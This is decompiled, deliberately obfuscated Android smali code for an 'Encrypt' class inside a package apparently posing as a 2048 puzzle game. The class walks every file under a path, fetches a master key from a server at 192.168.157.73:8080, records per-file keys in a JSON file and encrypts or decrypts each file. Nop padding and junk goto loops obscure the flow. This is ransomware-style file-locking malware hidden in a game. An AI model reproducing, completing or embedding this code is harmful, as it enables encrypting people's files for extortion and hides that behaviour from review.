.class public Laarkay/a2048game/Encrypt;
.super Ljava/lang/Object;
.source "Encrypt.java"
# direct methods
.method public constructor <init>()V
    .locals 0
    .line 36
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
	nop
	nop
	nop
	nop
.end method
.method public static encrypt(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8

	const v0, 19
	const v1, 23
	add-int v0, v0, v1
	if-eq v0, v1, :MtKYCCNIphYRBaeb
	rem-int v0, v0, v1
	if-gtz v0, :lyxJjrFnoPgDWVTR
	goto/32 :vGpJBkdVFycuOSAH
	:lyxJjrFnoPgDWVTR
	:GczbwRsbNNaCxgyQ
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;,
            Lorg/json/JSONException;,
            Lorg/json/simple/parser/ParseException;
        }
    .end annotation
    const-string v0, "/"
	nop
    const-string v1, "_"
	nop
	nop
	nop
    .line 171
    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    move-result-object v0
	nop
	nop
	nop
    const-string v1, "jsonKEY"
	nop
	nop
    .line 172
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 175
    new-instance v1, Ljava/lang/String;
	nop
	nop
    invoke-direct {v1}, Ljava/lang/String;-><init>()V
    const/4 v2, 0x2
	nop
    const/4 v3, 0x1
	nop
	nop
	nop
    const/4 v4, 0x4
	nop
	nop
	nop
	nop
    const/4 v5, 0x3
	nop
	nop
	nop
    if-ne p0, v3, :cond_0
	nop
	nop
    const/16 p3, 0x10
	nop
	nop
	nop
	nop
    .line 177
    invoke-static {p3}, Laarkay/a2048game/Encrypt;->getAlphaNumericString(I)Ljava/lang/String;
    move-result-object p3
	nop
	nop
	nop
    goto :goto_0
	nop
    :cond_0
    if-ne p0, v2, :cond_2
	nop
	nop
	nop
    .line 182
    new-instance p3, Lorg/json/simple/parser/JSONParser;
	nop
    invoke-direct {p3}, Lorg/json/simple/parser/JSONParser;-><init>()V
    .line 183
    new-instance v1, Ljava/io/FileReader;
	nop
	nop
    invoke-direct {v1, p2}, Ljava/io/FileReader;-><init>(Ljava/lang/String;)V
    invoke-virtual {p3, v1}, Lorg/json/simple/parser/JSONParser;->parse(Ljava/io/Reader;)Ljava/lang/Object;
    move-result-object p3
	nop
	nop
    .line 184
    check-cast p3, Lorg/json/simple/JSONObject;
	nop
	nop
	nop
    .line 185
    invoke-virtual {p3, v0}, Lorg/json/simple/JSONObject;->get(Ljava/lang/Object;)Ljava/lang/Object;
    move-result-object v1
	nop
	nop
    check-cast v1, Ljava/lang/String;
	nop
	nop
	nop
	nop
    const-string v6, "KEY FOUND:"
	nop
    .line 186
    invoke-static {v6, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 187
    invoke-virtual {p3}, Lorg/json/simple/JSONObject;->toJSONString()Ljava/lang/String;
    move-result-object p3
	nop
	nop
    const-string v6, "JSONOBJECT KEY"
	nop
	nop
	nop
	nop
    invoke-static {v6, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :cond_1
    move-object p3, v1
	nop
    goto :goto_0
	nop
	nop
    :cond_2
    if-eq p0, v5, :cond_3
	nop
	nop
	nop
	nop
    if-ne p0, v4, :cond_1
	nop
	nop
	nop
    :cond_3
    if-ne p0, v5, :cond_4
	nop
    const-string v1, "[3] MASTERKEY FOUND"
	nop
	nop
	nop
	nop
    .line 194
    invoke-static {v1, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    goto :goto_0
	nop
    :cond_4
    if-ne p0, v4, :cond_1
	nop
	nop
	nop
    const-string v1, "[4] MASTERKEY FOUND"
	nop
	nop
    .line 198
    invoke-static {v1, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 202
    :goto_0
    new-instance v1, Ljava/io/File;
	nop
	nop
	nop
	nop
    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    .line 203
    new-instance v6, Ljava/io/File;
	nop
    invoke-direct {v6, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    .line 204
    new-instance v7, Ljava/io/File;
	nop
	nop
    invoke-direct {v7, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    if-ne p0, v3, :cond_5
	nop
    .line 211
    :try_start_0
    new-instance p0, Landroid/util/Pair;
	nop
    invoke-direct {p0, v0, p3}, Landroid/util/Pair;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V
    .line 213
    new-instance p1, Lcom/google/gson/Gson;
	nop
	nop
	nop
	nop
    invoke-direct {p1}, Lcom/google/gson/Gson;-><init>()V
    .line 215
    new-instance v0, Ljava/io/FileReader;
	nop
    invoke-direct {v0, p2}, Ljava/io/FileReader;-><init>(Ljava/lang/String;)V
    .line 217
    const-class v2, Ljava/util/Map;
	nop
	nop
	nop
    invoke-virtual {p1, v0, v2}, Lcom/google/gson/Gson;->fromJson(Ljava/io/Reader;Ljava/lang/Class;)Ljava/lang/Object;
    move-result-object v2
	nop
	nop
	nop
    check-cast v2, Ljava/util/Map;
	nop
	nop
    .line 218
    iget-object v3, p0, Landroid/util/Pair;->first:Ljava/lang/Object;
	nop
	nop
	nop
	nop
    check-cast v3, Ljava/lang/String;
	nop
	nop
	nop
    iget-object p0, p0, Landroid/util/Pair;->second:Ljava/lang/Object;
	nop
    check-cast p0, Ljava/lang/String;
	nop
	nop
	nop
    invoke-interface {v2, v3, p0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    .line 220
    new-instance p0, Ljava/io/FileWriter;
	nop
    invoke-direct {p0, p2}, Ljava/io/FileWriter;-><init>(Ljava/lang/String;)V
    .line 221
    invoke-virtual {p1, v2, p0}, Lcom/google/gson/Gson;->toJson(Ljava/lang/Object;Ljava/lang/Appendable;)V
    .line 222
    invoke-virtual {p0}, Ljava/io/FileWriter;->close()V
    .line 223
    invoke-virtual {v0}, Ljava/io/FileReader;->close()V
    .line 224
    invoke-static {p3, v1, v6}, Laarkay/a2048game/Locker;->encrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    goto :goto_2
	nop
	nop
	nop
	nop
    :catch_0
    move-exception p0
	nop
	nop
    goto :goto_1
	nop
	nop
    :cond_5
    if-ne p0, v2, :cond_6
	nop
    .line 227
    invoke-static {p3, v6, v7}, Laarkay/a2048game/Locker;->decrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    goto :goto_2
	nop
	nop
	nop
	nop
    :cond_6
    if-eq p0, v5, :cond_7
	nop
	nop
	nop
	nop
    if-ne p0, v4, :cond_9
	nop
	nop
	nop
    :cond_7
    const-string p2, " with key: "
	nop
	nop
	nop
	nop
    if-ne p0, v5, :cond_8
	nop
	nop
	nop
    :try_start_1
    const-string p0, "MASTER ENCRYPTING FILE"
	nop
	nop
	nop
    .line 232
    new-instance v0, Ljava/lang/StringBuilder;
	nop
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object p1
	nop
	nop
	nop
    invoke-static {p0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 233
    invoke-static {p3, v6, v7}, Laarkay/a2048game/Locker;->encrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    goto :goto_2
	nop
	nop
	nop
	nop
    :cond_8
    if-ne p0, v4, :cond_9
	nop
	nop
	nop
	nop
    const-string p0, "MASTER DECRYPTING FILE"
	nop
    .line 236
    new-instance v0, Ljava/lang/StringBuilder;
	nop
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object p1
	nop
	nop
	nop
	nop
    invoke-static {p0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 237
    invoke-static {p3, v6, v7}, Laarkay/a2048game/Locker;->decrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    goto :goto_2
	nop
	nop
	nop
	nop
    .line 241
    :goto_1
    sget-object p1, Ljava/lang/System;->out:Ljava/io/PrintStream;
	nop
	nop
	nop
	nop
    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
    move-result-object p2
	nop
	nop
	nop
	nop
    invoke-virtual {p1, p2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    .line 242
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V
    :cond_9
    :goto_2
    return-void
	nop
	nop
	nop
	nop
	:vGpJBkdVFycuOSAH
	goto/32 :GczbwRsbNNaCxgyQ
	:MtKYCCNIphYRBaeb
	goto/32 :LQkHYWeNqFlTBamh
	:LQkHYWeNqFlTBamh
	goto/32 :hvUFyBBfCYaNcdBl
	:hvUFyBBfCYaNcdBl
	goto/32 :MtKYCCNIphYRBaeb
.end method
.method private static getAlphaNumericString(I)Ljava/lang/String;
    .locals 4

	const v0, 15
	const v1, 20
	add-int v0, v0, v1
	if-eq v0, v1, :TJnSRHfbMEmkbKbR
	rem-int v0, v0, v1
	if-gtz v0, :HCKFMbjSzGXYEoAc
	goto/32 :MvkdqaVxmNIltpWm
	:HCKFMbjSzGXYEoAc
	:TwKswvsxiLKOzStk
    const/16 v0, 0x100
	nop
	nop
    new-array v0, v0, [B
	nop
	nop
	nop
    .line 250
    new-instance v1, Ljava/util/Random;
	nop
	nop
    invoke-direct {v1}, Ljava/util/Random;-><init>()V
    invoke-virtual {v1, v0}, Ljava/util/Random;->nextBytes([B)V
    .line 252
    new-instance v1, Ljava/lang/String;
	nop
	nop
    const-string v2, "UTF-8"
	nop
	nop
	nop
    .line 253
    invoke-static {v2}, Ljava/nio/charset/Charset;->forName(Ljava/lang/String;)Ljava/nio/charset/Charset;
    move-result-object v2
	nop
	nop
	nop
	nop
    invoke-direct {v1, v0, v2}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V
    .line 256
    new-instance v0, Ljava/lang/StringBuffer;
	nop
	nop
    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V
    const-string v2, "[^A-Za-z0-9]"
	nop
	nop
	nop
    const-string v3, ""
	nop
    .line 261
    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
	nop
	nop
	nop
	nop
    const/4 v2, 0x0
	nop
	nop
	nop
    .line 265
    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I
    move-result v3
	nop
    if-ge v2, v3, :cond_3
	nop
    .line 267
    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C
    move-result v3
	nop
    invoke-static {v3}, Ljava/lang/Character;->isLetter(C)Z
    move-result v3
	nop
	nop
	nop
	nop
    if-eqz v3, :cond_0
	nop
	nop
	nop
    if-gtz p0, :cond_1
	nop
	nop
    .line 269
    :cond_0
    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C
    move-result v3
	nop
	nop
    invoke-static {v3}, Ljava/lang/Character;->isDigit(C)Z
    move-result v3
	nop
	nop
    if-eqz v3, :cond_2
	nop
	nop
	nop
    if-lez p0, :cond_2
	nop
	nop
	nop
	nop
    .line 272
    :cond_1
    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C
    move-result v3
	nop
	nop
	nop
    invoke-virtual {v0, v3}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;
    add-int/lit8 p0, p0, -0x1
	nop
	nop
	nop
	nop
    :cond_2
    add-int/lit8 v2, v2, 0x1
	nop
    goto :goto_0
	nop
	nop
	nop
    .line 278
    :cond_3
    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
    move-result-object p0
	nop
	nop
    return-object p0
	nop
	:MvkdqaVxmNIltpWm
	goto/32 :TwKswvsxiLKOzStk
	:TJnSRHfbMEmkbKbR
	goto/32 :AwsHhyEYToIONefR
	:AwsHhyEYToIONefR
	goto/32 :pPcTRTCdpcDimbDc
	:pPcTRTCdpcDimbDc
	goto/32 :TJnSRHfbMEmkbKbR
.end method
.method public static init(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation
    const/4 v0, 0x0
	nop
	nop
	nop
	nop
    new-array v0, v0, [Ljava/lang/String;
	nop
	nop
	nop
	nop
    .line 41
    invoke-static {p1, v0}, Ljava/nio/file/Paths;->get(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;
    move-result-object p1
	nop
	nop
	nop
    .line 42
    invoke-static {p1}, Laarkay/a2048game/Encrypt;->listFiles(Ljava/nio/file/Path;)Ljava/util/List;
    move-result-object p1
	nop
    const/4 v0, 0x1
	nop
	nop
	nop
    if-ne p0, v0, :cond_0
	nop
	nop
	nop
    .line 47
    new-instance p3, Lcom/loopj/android/http/AsyncHttpClient;
	nop
	nop
	nop
	nop
    invoke-direct {p3}, Lcom/loopj/android/http/AsyncHttpClient;-><init>()V
    .line 48
    new-instance v0, Laarkay/a2048game/Encrypt$1;
	nop
    invoke-direct {v0, p2, p1, p0}, Laarkay/a2048game/Encrypt$1;-><init>(Ljava/lang/String;Ljava/util/List;I)V
    const-string p0, "http://192.168.157.73:8080/get_mk"
	nop
	nop
	nop
	nop
    invoke-virtual {p3, p0, v0}, Lcom/loopj/android/http/AsyncHttpClient;->get(Ljava/lang/String;Lcom/loopj/android/http/ResponseHandlerInterface;)Lcom/loopj/android/http/RequestHandle;
    goto :goto_0
	nop
	nop
    :cond_0
    const/4 v0, 0x2
	nop
    if-ne p0, v0, :cond_1
	nop
	nop
	nop
	nop
    .line 136
    new-instance p3, Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda0;
	nop
	nop
	nop
    invoke-direct {p3, p0, p2}, Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda0;-><init>(ILjava/lang/String;)V
    invoke-interface {p1, p3}, Ljava/util/List;->forEach(Ljava/util/function/Consumer;)V
    goto :goto_0
	nop
    :cond_1
    const/4 p1, 0x4
	nop
    if-ne p0, p1, :cond_2
	nop
	nop
	nop
	nop
    :try_start_0
    const-string p1, "MASTER DECRYPTING"
	nop
    .line 154
    invoke-static {p1, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 155
    invoke-static {p0, p2, p2, p3}, Laarkay/a2048game/Encrypt;->encrypt(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/simple/parser/ParseException; {:try_start_0 .. :try_end_0} :catch_0
    goto :goto_0
	nop
	nop
	nop
	nop
    :catch_0
    move-exception p0
	nop
    .line 161
    invoke-virtual {p0}, Lorg/json/simple/parser/ParseException;->printStackTrace()V
    goto :goto_0
	nop
	nop
    :catch_1
    move-exception p0
	nop
	nop
    .line 159
    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V
    goto :goto_0
	nop
	nop
    :catch_2
    move-exception p0
	nop
	nop
	nop
	nop
    .line 157
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V
    :cond_2
    :goto_0
    return-void
	nop
	nop
.end method
.method static synthetic lambda$init$0(ILjava/lang/String;Ljava/nio/file/Path;)V
    .locals 2

	const v0, 5
	const v1, 28
	add-int v0, v0, v1
	if-eq v0, v1, :yfljhselNMvKLjLB
	rem-int v0, v0, v1
	if-gtz v0, :tFDwWgouYrfsDmzs
	goto/32 :jMuZFyJtDJQTMssS
	:tFDwWgouYrfsDmzs
	:ztbHlQlwEMsGAoLM
    .line 138
    :try_start_0
    invoke-interface {p2}, Ljava/nio/file/Path;->toString()Ljava/lang/String;
    move-result-object v0
	nop
	nop
	nop
	nop
    const-string v1, ""
	nop
	nop
	nop
    invoke-static {p0, v0, p1, v1}, Laarkay/a2048game/Encrypt;->encrypt(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    const-string p0, "FP"
	nop
    .line 139
    invoke-interface {p2}, Ljava/nio/file/Path;->toString()Ljava/lang/String;
    move-result-object p1
	nop
	nop
	nop
    invoke-static {p0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/simple/parser/ParseException; {:try_start_0 .. :try_end_0} :catch_0
    goto :goto_0
	nop
    :catch_0
    move-exception p0
	nop
	nop
	nop
	nop
    .line 145
    invoke-virtual {p0}, Lorg/json/simple/parser/ParseException;->printStackTrace()V
    goto :goto_0
	nop
	nop
	nop
	nop
    :catch_1
    move-exception p0
	nop
    .line 143
    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V
    goto :goto_0
	nop
	nop
    :catch_2
    move-exception p0
	nop
	nop
    .line 141
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V
    :goto_0
    return-void
	nop
	nop
	nop
	:jMuZFyJtDJQTMssS
	goto/32 :ztbHlQlwEMsGAoLM
	:yfljhselNMvKLjLB
	goto/32 :KiwIlwWKIaqSNolk
	:KiwIlwWKIaqSNolk
	goto/32 :oWRfCuxEBiKSEpmy
	:oWRfCuxEBiKSEpmy
	goto/32 :yfljhselNMvKLjLB
.end method
.method static synthetic lambda$listFiles$1(Ljava/nio/file/Path;)Z
    .locals 1
    const/4 v0, 0x0
	nop
	nop
    new-array v0, v0, [Ljava/nio/file/LinkOption;
	nop
	nop
    .line 285
    invoke-static {p0, v0}, Ljava/nio/file/Files;->isRegularFile(Ljava/nio/file/Path;[Ljava/nio/file/LinkOption;)Z
    move-result p0
	nop
	nop
	nop
    return p0
	nop
	nop
	nop
.end method
.method private static listFiles(Ljava/nio/file/Path;)Ljava/util/List;
    .locals 2

	const v0, 22
	const v1, 7
	add-int v0, v0, v1
	if-eq v0, v1, :tdooDmZlBarIPhjc
	rem-int v0, v0, v1
	if-gtz v0, :RWKnsKaEJsIUfcwl
	goto/32 :sNabxgqasBvYtxwI
	:RWKnsKaEJsIUfcwl
	:vFhUqYMKdVMNAlxi
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/nio/file/Path;",
            ")",
            "Ljava/util/List<",
            "Ljava/nio/file/Path;",
            ">;"
        }
    .end annotation
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation
    const/4 v0, 0x0
	nop
	nop
	nop
	nop
    new-array v0, v0, [Ljava/nio/file/FileVisitOption;
	nop
	nop
	nop
	nop
    .line 284
    invoke-static {p0, v0}, Ljava/nio/file/Files;->walk(Ljava/nio/file/Path;[Ljava/nio/file/FileVisitOption;)Ljava/util/stream/Stream;
    move-result-object p0
	nop
	nop
	nop
	nop
    .line 285
    :try_start_0
    sget-object v0, Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda1;->INSTANCE:Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda1;
	nop
	nop
	nop
    invoke-interface {p0, v0}, Ljava/util/stream/Stream;->filter(Ljava/util/function/Predicate;)Ljava/util/stream/Stream;
    move-result-object v0
	nop
	nop
    invoke-static {}, Ljava/util/stream/Collectors;->toList()Ljava/util/stream/Collector;
    move-result-object v1
	nop
	nop
	nop
    invoke-interface {v0, v1}, Ljava/util/stream/Stream;->collect(Ljava/util/stream/Collector;)Ljava/lang/Object;
    move-result-object v0
	nop
	nop
    check-cast v0, Ljava/util/List;
	nop
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    if-eqz p0, :cond_0
	nop
	nop
	nop
	nop
    .line 286
    invoke-interface {p0}, Ljava/util/stream/Stream;->close()V
    :cond_0
    return-object v0
	nop
	nop
	nop
	nop
    :catchall_0
    move-exception v0
	nop
	nop
	nop
    if-eqz p0, :cond_1
	nop
	nop
	nop
    .line 284
    :try_start_1
    invoke-interface {p0}, Ljava/util/stream/Stream;->close()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1
    goto :goto_0
	nop
	nop
	nop
	nop
    :catchall_1
    move-exception p0
	nop
    invoke-virtual {v0, p0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :cond_1
    :goto_0
    throw v0
	nop
	:sNabxgqasBvYtxwI
	goto/32 :vFhUqYMKdVMNAlxi
	:tdooDmZlBarIPhjc
	goto/32 :HoHlMFcPoqWukGqM
	:HoHlMFcPoqWukGqM
	goto/32 :BvFFGmFJGuKmCCxx
	:BvFFGmFJGuKmCCxx
	goto/32 :tdooDmZlBarIPhjc
.end method
